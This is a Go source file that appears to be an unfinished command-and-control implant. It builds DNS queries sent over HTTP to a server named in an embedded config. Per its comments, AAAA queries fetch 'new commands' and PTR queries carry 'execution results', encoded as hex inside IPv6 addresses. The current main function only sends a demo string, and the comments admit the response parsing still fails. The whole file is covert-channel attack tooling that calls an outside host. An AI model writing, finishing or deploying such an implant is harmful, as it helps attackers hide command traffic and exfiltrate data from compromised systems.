//go:build dns

package main

import (
	"bytes"
	_ "embed"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"time"

	"golang.org/x/net/dns/dnsmessage"
)

//go:embed config.json
var configData []byte // Embedded config data

// Config struct to hold configuration
type Config struct {
	DNSServer string `json:"dns_server"`
}

// Convert the input string to hex representation
func ConvertStringToIPv6Array(input string) ([]net.IP, error) {
	// Takes a string for input and converts it to hex then to an IPv6 representation
	// Facilitates data encoding for transfer in PTR requests
	// Returns an array of IPv6 addresses and an error if any
	hexString := hex.EncodeToString([]byte(input))

	// Calculate the number of IPv6 addresses we will have
	numAddresses := len(hexString) / 32
	if len(hexString)%32 != 0 {
		numAddresses++ // Add an extra address if there's a remainder
	}

	// Initialize an array to store the IPv6 addresses
	var ipv6Addresses []net.IP

	// Iterate through each 32-character chunk of the hex string
	for i := 0; i < len(hexString); i += 32 {
		// Take a 32-character chunk (16 bytes for IPv6)
		end := i + 32
		if end > len(hexString) {
			end = len(hexString)
		}
		chunk := hexString[i:end]

		// Pad the chunk to 32 characters with "0" if it's not a full 16 bytes
		if len(chunk) < 32 {
			chunk = chunk + strings.Repeat("0", 32-len(chunk))
		}

		// Decode the hex string into bytes
		addrBytes, err := hex.DecodeString(chunk)
		if err != nil {
			return nil, fmt.Errorf("failed to decode hex chunk: %v", err)
		}

		// Convert the bytes to an IPv6 address
		ip := net.IP(addrBytes).To16()
		if ip == nil {
			return nil, fmt.Errorf("invalid IPv6 address in chunk: %s", chunk)
		}

		// Add the IPv6 address to the array
		ipv6Addresses = append(ipv6Addresses, ip)
	}

	return ipv6Addresses, nil
}

// Function to reverse an IPv6 address for PTR lookup
func reverseIPv6(ip net.IP) (string, error) {
	ip = ip.To16()
	if ip == nil {
		return "", fmt.Errorf("invalid IPv6 address")
	}
	var parts []string
	for i := len(ip) - 1; i >= 0; i-- {
		parts = append(parts, fmt.Sprintf("%x.%x", ip[i]&0xF, ip[i]>>4))
	}
	return strings.Join(parts, ".") + ".ip6.arpa.", nil
}

// Function to load configuration from embedded JSON
func loadConfig() (Config, error) {
	var config Config
	if err := json.Unmarshal(configData, &config); err != nil {
		return Config{}, err
	}
	return config, nil
}

// Creates the PTR request for return execution results
func CreatePTRRequest(ipv6Addr []byte, transactionID uint16) ([]byte, error) {
	// Takes a byte array of IPv6 addresses
	// Creates a PTR req containing all these addresses
	// Returns the constructed PTR req to send
	// This function is used to communicate data
	// Information must first be encoded into hex then marshalled into IPv6 format
	if len(ipv6Addr) != 16 {
		return nil, fmt.Errorf("invalid IPv6 address length: expected 16 bytes")
	}

	// Convert IPv6 address to reverse DNS format
	reverseAddr, err := reverseIPv6(ipv6Addr)
	if err != nil {
		return nil, fmt.Errorf("failed to reverse IPv6 address: %v", err)
	}

	// Construct the DNS message
	var msg dnsmessage.Message
	msg.Header.ID = transactionID
	msg.Header.RecursionDesired = true
	msg.Questions = []dnsmessage.Question{
		{
			Name:  dnsmessage.MustNewName(reverseAddr),
			Type:  dnsmessage.TypePTR,
			Class: dnsmessage.ClassINET,
		},
	}

	// Pack the DNS message into a byte array
	packet, err := msg.Pack()
	if err != nil {
		return nil, fmt.Errorf("failed to pack DNS message: %v", err)
	}

	return packet, nil
}

// Creates the AAAA query for getting new commands
func CreateAAAARequest(transactionID uint16) ([]byte, error) {
	// Takes a byte array of IPv6 addresses
	// Creates a AAAA query for example.com
	// Returns the string command received and error if any

	// Construct the DNS message
	var msg dnsmessage.Message
	msg.Header.ID = transactionID
	msg.Header.RecursionDesired = true

	// Add the question section
	msg.Questions = []dnsmessage.Question{
		{
			Name:  dnsmessage.MustNewName("matt.culbert."),
			Type:  dnsmessage.TypeAAAA,
			Class: dnsmessage.ClassINET,
		},
	}

	// Add EDNS0 for larger UDP payloads
	msg.Additionals = []dnsmessage.Resource{
		{
			Header: dnsmessage.ResourceHeader{
				Name:  dnsmessage.MustNewName("."),
				Type:  dnsmessage.TypeOPT,
				Class: 4096, // Request 4096-byte payload size
			},
			Body: &dnsmessage.OPTResource{},
		},
	}

	// Pack the DNS message into a byte array
	packet, err := msg.Pack()
	if err != nil {
		return nil, fmt.Errorf("failed to pack DNS message: %v", err)
	}

	return packet, nil
}

func PerformDoHRequest(dohURL string, query []byte) ([]byte, error) {
	// Create an HTTP client with a timeout
	client := &http.Client{
		Timeout: 15 * time.Second,
	}

	// Prepare the HTTP request
	req, err := http.NewRequest("POST", dohURL, bytes.NewBuffer(query))
	if err != nil {
		return nil, fmt.Errorf("failed to create HTTP request: %v", err)
	}
	req.Header.Set("Content-Type", "application/dns-message")

	// Perform the HTTP request
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to send DoH request: %v", err)
	}
	defer resp.Body.Close()

	// Check if the response status is OK
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("DoH server returned non-OK status: %s", resp.Status)
	}

	// Read the response body into a byte slice
	responseData, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read DoH response body: %v", err)
	}
	//asString := string(responseData)
	fmt.Println("DoH Response:", responseData)
	return responseData, nil
}

func main() {
	// Load configuration from embedded data
	configData, err := loadConfig()
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	// Check for DNS server in config
	if configData.DNSServer == "" {
		log.Fatalf("DNS server not specified in config")
	}

	input := "Hello, IPv6 World!"

	// Convert the string to an array of IPv6 addresses
	ipv6Array, err := ConvertStringToIPv6Array(input)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	// Print the resulting IPv6 addresses
	for i, n := range ipv6Array {
		fmt.Printf("IPv6 Address %d: %s\n", i+1, n)
	}

	ip := net.ParseIP("2001:4860:4860::8888").To16()
	if ip == nil {
		log.Fatalf("Invalid IPv6 address")
	}

	// Create PTR request with transaction ID 12345
	packet, err := CreatePTRRequest(ip, 12345)
	if err != nil {
		log.Fatalf("Failed to create PTR request: %v", err)
	}

	fmt.Printf("Constructed PTR Request Packet: %x\n", packet)

	transactionID := uint16(1234)
	aaaaQuery, err := CreateAAAARequest(transactionID)
	if err != nil {
		log.Fatalf("Failed to create AAAA request: %v", err)
	}

	dohUrl := "http://" + configData.DNSServer

	// Perform the DoH request
	responseData, err := PerformDoHRequest(dohUrl, aaaaQuery)
	if err != nil {
		log.Fatalf("Failed to perform DoH request: %v", err)
	}

	// This will error right now since the data we get back is not a real IPv6 address
	// Unpack and parse the DNS response
	// Currently this only works on the first request to the server
	// 2nd request will fail until the server.py is restarted
	var response dnsmessage.Message
	fmt.Printf("Raw DNS Response (Hex): %x\n", responseData)
	err = response.Unpack(responseData)
	if err != nil {
		log.Fatalf("Failed to unpack DNS response: %v", err)
	}

	// Print the AAAA records from the response
	for _, answer := range response.Answers {
		if answer.Header.Type == dnsmessage.TypeAAAA {
			fmt.Printf("AAAA Record: %v\n", answer.Body.(*dnsmessage.AAAAResource).AAAA)
		}
	}
}
